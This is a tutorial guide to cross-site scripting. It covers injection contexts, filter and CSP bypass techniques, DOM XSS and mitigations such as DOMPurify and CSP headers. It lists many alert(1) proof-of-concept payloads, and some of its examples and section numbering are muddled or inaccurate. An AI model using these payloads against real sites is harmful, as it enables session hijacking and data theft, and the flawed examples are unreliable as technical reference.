# Comprehensive Guide on Cross-Site Scripting (XSS) and Its Bypasses
Cross-Site Scripting (XSS) is a widespread vulnerability that allows attackers to inject malicious scripts into web pages viewed by other users. This guide covers the types of XSS, methodologies for detection and exploitation, contexts of injection, and advanced techniques for bypassing protections.

1. Introduction to XSS
XSS attacks enable attackers to inject malicious scripts into web pages. These scripts can execute in the context of a user's browser, allowing attackers to steal information, hijack sessions, or perform actions on behalf of the user.

1.1 Types of XSS
Stored XSS: The malicious script is permanently stored on the target server, such as in a database or comment field.
Reflected XSS: The malicious script is reflected off a web server, typically via a URL query parameter.
DOM-Based XSS: The vulnerability exists in the client-side code rather than the server-side code, and the attack payload is executed as a result of modifying the DOM environment.

2. Methodology for Detecting XSS
2.1 Identify Injection Points
   
Check if any value you control (parameters, path, headers, cookies) is reflected in the HTML or used by JavaScript code.

# Determine Reflection Context

Raw HTML: Can you create new HTML tags or use attributes/events that support JavaScript?
Inside HTML Tag: Can you exit to raw HTML or create events/attributes to execute JavaScript?
Inside JavaScript Code: Can you escape the <script> tag or string context to execute arbitrary JavaScript?
4. Contexts for XSS Injection
Raw HTML Context
When your input is reflected in the raw HTML of a page, you can exploit it by injecting HTML tags that execute JavaScript. Common tags include:
```
<img src=x onerror=alert(1)>
<iframe src="javascript:alert(1)">
<svg onload=alert(1)>
```
3.2 Inside HTML Tag Attributes
If your input is reflected within an attribute value, consider the following approaches:

Escape Attribute and Tag: 
```
"><img src=x onerror=alert(1)>
```

Event Handlers: If escaping the tag is not possible, use attributes like onfocus, onclick: " autofocus onfocus=alert(1) x="
JavaScript Protocol: If within href, use javascript:: href="javascript:alert(1)"
3.3 Inside JavaScript Code
If the input is reflected within JavaScript code, you need to break out of the string or the <script> tag to execute arbitrary code:

Escape String: "; alert(1); "
Template Literals: If input is in a template literal: `${alert(1)}`
4. Advanced Techniques and Bypasses
4.1 Content Security Policy (CSP) Bypass
CSP is a security measure that helps prevent XSS by specifying trusted content sources. However, it can be bypassed if not correctly configured.

4.1.1 Methods to Bypass CSP
Using JSONP: Exploit JSONP endpoints that execute arbitrary JavaScript.
Misconfigured CSP Headers: Overly permissive or misconfigured CSP headers, such as those allowing unsafe-inline or unsafe-eval.
Inline Script Allowances: Inject inline scripts if the CSP allows it.
4.1.2 Example CSP Bypass
```
<script nonce="random-nonce">
    fetch('https://example.com/jsonp?callback=alert(1)')
</script>
```
4.2 Polyglot XSS
Polyglot payloads can function in multiple contexts (HTML, JS, CSS) to bypass input filters.

4.2.1 Example Polyglot Payload
```
"><svg onload=alert(1)><script>alert(1)</script>
4.3 Dangling Markup - HTML Scriptless Injection
```
If you cannot create executing HTML tags, you might abuse dangling markup, which involves placing incomplete tags that break the current HTML context.

4.3.1 Example Dangling Markup
```
<a href="/">Click here</a><b 
<script>alert(1)</script>
```
4.4 JSON-based XSS
When web applications parse JSON data and directly insert it into the DOM without proper sanitization, it can lead to XSS.

4.4.1 Example JSON-based XSS
```
{"name": "<img src=x onerror=alert(1)> "}
```
4.5 Bypassing Filters
Using techniques like UTF-7 encoding, breaking out of existing tags, or leveraging uncommon payloads.

Example UTF-7 Encoding
```
<iframe src="data:text/html;charset=utf-7,%2BADw-script%2BAD4-alert('XSS')%2BADw-/script%2BAD4-"></iframe>
```
4.6 Using HTML Entities
Encoding the payload using HTML entities to bypass filters that block certain characters.

4.6.1 Example HTML Entities
```
<img src=x onerror=&#x61;&#x6c;&#x65;&#x72;&#x74;(1)>
```
4.7 Null Byte Injection
Using null bytes to bypass filters or terminate strings early.

4.7.1 Example Null Byte Injection
```
<img src="x" onerror="alert(1)";%00" src="y">
```
4.8 Case Variation
Altering the case of HTML tags and attributes to bypass case-sensitive filters.

4.8.1 Example Case Variation
```
<Svg OnloAd=alert(1)>
```
4.9 Using Backticks in JavaScript
Bypassing filters by using backticks in JavaScript for template literals.

4.9.1 Example Using Backticks
```
<script>let a = `alert(1)`</script>
```
4.10 Chained XSS
Combining multiple injection points to achieve a successful XSS attack.

4.10.1 Example Chained XSS
Injecting part of the payload in one input and another part in a different input to form a complete attack.

5. Exploiting DOM XSS
DOM XSS occurs when a script on the page modifies the DOM based on user input, potentially leading to the execution of malicious scripts.

5.1 Finding and Exploiting DOM XSS
Identify Sinks: Look for functions or methods (e.g., innerHTML, document.write) that render user-controlled input.
Control Flow: Understand how user input flows through the application to these sinks.
Payload Construction: Craft payloads that exploit these sinks.
5.1.1 Example DOM XSS Payload
```
<input oninput="document.getElementById('output').innerHTML = this.value">
<input value="<img src=x onerror=alert(1)>">
```
6. Debugging Client-Side JavaScript
When working with complex XSS payloads, debugging client-side JavaScript can help understand how input is processed and reflected.

6.1 Tools for Debugging
Browser Developer Tools: Use the console, breakpoints, and step through the JavaScript code to understand the application flow and find XSS injection points.
7. Mitigations and Best Practices
7.1 Input Validation and Sanitization
Ensure all user inputs are validated and sanitized before being processed or rendered.

7.1.1 Example Sanitization
Use libraries like DOMPurify to clean HTML inputs.

7.2 Content Security Policy (CSP)
Properly configure CSP headers to mitigate XSS.

7.2.1 Example CSP Header

Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-random-nonce'
7.3 Escaping Outputs
Always escape data before rendering it in HTML, JavaScript, or other client-side contexts.

Example Escaping
Use functions like htmlspecialchars in PHP or escape in Python.

Use Security Libraries
Utilize libraries like DOMPurify to clean HTML inputs and prevent XSS.

 Example DOMPurify Usage

var clean = DOMPurify.sanitize(dirty);
8. References
Pentest-Tools Blog on XSS Attacks
Hacktricks XSS Documentation
Hacktricks on CSP Bypass
This guide provides a comprehensive overview of XSS, various attack scenarios, contexts of injection, advanced techniques, and best practices for mitigation. Understanding these concepts is crucial for both defending against and exploiting XSS vulnerabilities in web applications.
